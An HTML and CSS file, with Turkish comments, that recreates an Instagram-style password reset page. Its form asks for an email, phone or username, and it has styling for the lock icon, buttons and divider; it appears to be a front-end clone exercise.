<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password • Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>

<body class="login-page">

    <div class="auth-container">
        <div class="auth-box">
            <div class="lock-icon">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="50"
                    height="50">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
            </div>

            <h4 class="forgot-title">Trouble Logging In?</h4>
            <p class="forgot-text">Enter your email, phone, or username and we'll send you a link to get back into your
                account.</p>

            <form action="/api/reset-password" method="POST">
                <div class="input-group">
                    <input type="text" name="identifier" placeholder="Email, Phone, or Username" required>
                </div>
                <button type="submit" class="auth-btn">Send Login Link</button>
            </form>

            <div class="auth-divider">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>

            <a href="login.html" onclick="toggleForms()" class="create-new-account">Create New Account</a>
        </div>

        <div class="auth-box alt-box back-login-box">
            <a href="login.html">Back to Login</a>
        </div>
    </div>

    <script src="script.js"></script>

</body>

</html>

<style>
    /* =========================================
   1. GENEL AYARLAR VE GİRİŞ SAYFASI (BASE)
   ========================================= */
    body {
        background-color: #fafafa;
        /* Arka plan gri */
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
    }

    .auth-container {
        width: 350px;
        /* Kutuların genişliği */
        margin-top: 30px;
    }

    .auth-box {
        background-color: #fff;
        /* Kutu rengi beyaz */
        border: 1px solid #dbdbdb;
        /* Çerçeve rengi */
        padding: 30px 40px;
        margin-bottom: 10px;
        text-align: center;
    }

    /* Logo Ayarları */
    .auth-logo {
        font-family: 'Grand Hotel', cursive;
        font-size: 3rem;
        margin: 10px 0 30px 0;
    }

    .auth-subtitle {
        font-size: 17px;
        font-weight: 600;
        color: #8e8e8e;
        margin-bottom: 20px;
    }

    /* Input (Yazı Alanı) Ayarları */
    .input-group input {
        width: 100%;
        background-color: #fafafa;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        padding: 9px 0 7px 8px;
        margin-bottom: 6px;
        box-sizing: border-box;
        font-size: 12px;
    }

    .input-group input:focus {
        border: 1px solid #a8a8a8;
        outline: none;
    }

    /* Mavi Buton Ayarları */
    .auth-btn {
        background-color: #0095f6;
        border: 1px solid transparent;
        border-radius: 4px;
        color: #fff;
        font-weight: 600;
        width: 100%;
        padding: 5px 9px;
        margin-top: 10px;
        cursor: pointer;
    }

    .auth-btn:hover {
        background-color: #1877f2;
    }

    /* Çizgili "YA DA" Kısmı */
    .auth-divider {
        display: flex;
        align-items: center;
        margin: 20px 0;
    }

    .line {
        flex-grow: 1;
        height: 1px;
        background-color: #dbdbdb;
    }

    .auth-divider p {
        margin: 0 10px;
        font-size: 13px;
        font-weight: 600;
        color: #8e8e8e;
    }

    /* Linkler */
    .google-login {
        display: flex;
        align-items: center;
        justify-content: center;
        text-decoration: none;
        margin-top: 20px;
        gap: 8px;
        color: #385185;
        font-weight: 600;
        font-size: 14px;
    }

    .forgot-pass {
        display: block;
        font-size: 12px;
        color: #00376b;
        text-decoration: none;
        margin-top: 15px;
    }

    /* Alt Kutu (Hesabın yok mu?) */
    .alt-box p {
        margin: 0;
        font-size: 14px;
    }

    .alt-box span,
    .alt-box a {
        color: #0095f6;
        font-weight: 600;
        text-decoration: none;
        cursor: pointer;
    }

    .hidden {
        display: none;
    }

    .terms {
        font-size: 12px;
        color: #8e8e8e;
        margin: 15px 0;
        line-height: 1.4;
    }

    /* =========================================
   2. ŞİFRE YENİLEME SAYFASI ÖZEL (FORGOT PASSWORD)
   ========================================= */

    .lock-icon {
        border: 2px solid #262626;
        border-radius: 50%;
        width: 70px;
        height: 70px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 10px auto 20px;
    }

    .forgot-title {
        font-size: 16px;
        font-weight: 600;
        color: #262626;
        margin: 0 0 10px 0;
    }

    .forgot-text {
        color: #8e8e8e;
        font-size: 14px;
        line-height: 1.5;
        margin-bottom: 20px;
    }

    .create-new-account {
        display: block;
        color: #262626;
        font-size: 14px;
        font-weight: 600;
        text-decoration: none;
        background-color: #fafafa;
        padding: 10px;
        border: 1px solid #dbdbdb;
        margin-top: 15px;
    }

    /* Alt kutudaki 'Giriş Yap'a Dön' stili */
    .back-login-box {
        background-color: #fafafa;
        border-top: 1px solid #dbdbdb;
    }

    .back-login-box a {
        color: #262626;
        font-weight: 600;
        font-size: 14px;
        text-decoration: none;
    }
</style>
